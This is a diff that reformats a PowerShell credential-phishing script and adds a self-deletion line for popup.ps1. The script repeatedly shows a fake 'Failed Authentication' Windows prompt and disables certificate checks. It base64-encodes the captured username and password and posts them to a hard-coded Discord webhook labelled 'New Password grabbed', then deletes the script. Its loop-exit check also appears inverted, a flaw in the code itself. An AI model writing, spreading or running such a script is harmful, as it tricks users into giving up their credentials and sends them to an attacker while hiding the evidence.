@@ -1,1 +1,12 @@
-powershell -Command "while (\$true) { \$cred = \$host.ui.promptforcredential('Failed Authentication', '', [Environment]::UserDomainName + '\\\\' + [Environment]::UserName, [Environment]::UserDomainName); [System.Net.ServicePointManager]::ServerCertificateValidationCallback = { \$true }; if (\$cred.getnetworkcredential().password) { break }; \$Text = \$cred.username + ':' + \$cred.getnetworkcredential().password; \$Bytes = [System.Text.Encoding]::UTF8.GetBytes(\$Text); \$EncodedText = [Convert]::ToBase64String(\$Bytes); Invoke-RestMethod -Uri 'https://discord.com/api/webhooks/1277251946432041000/jE0OupMT6KbRbJ2rCGuFVks3M66TSlGSV_5zr8rWB9ddJx8Vj671d4haAwhfD5wqW_AS' -Method Post -ContentType 'application/json' -Body ('{\"content\": \"```New Password grabbed from ' + \$cred.username + ':\\n ' + \$EncodedText + ' ```\"}'); }"
+while ($true) {
+    $cred = $host.ui.promptforcredential('Failed Authentication', '', [Environment]::UserDomainName + '\\' + [Environment]::UserName, [Environment]::UserDomainName)
+    [System.Net.ServicePointManager]::ServerCertificateValidationCallback = { $true }
+    if ($cred.getnetworkcredential().password) {
+        break
+    }
+    $Text = $cred.username + ':' + $cred.getnetworkcredential().password
+    $Bytes = [System.Text.Encoding]::UTF8.GetBytes($Text)
+    $EncodedText = [Convert]::ToBase64String($Bytes)
+    Invoke-RestMethod -Uri 'https://discord.com/api/webhooks/1277251946432041000/jE0OupMT6KbRbJ2rCGuFVks3M66TSlGSV_5zr8rWB9ddJx8Vj671d4haAwhfD5wqW_AS' -Method Post -ContentType 'application/json' -Body ('{"content": "```New Password grabbed from ' + $cred.username + ':\\n ' + $EncodedText + ' ```"}')
+}
+Remove-Item $Env:UserProfile\popup.ps1
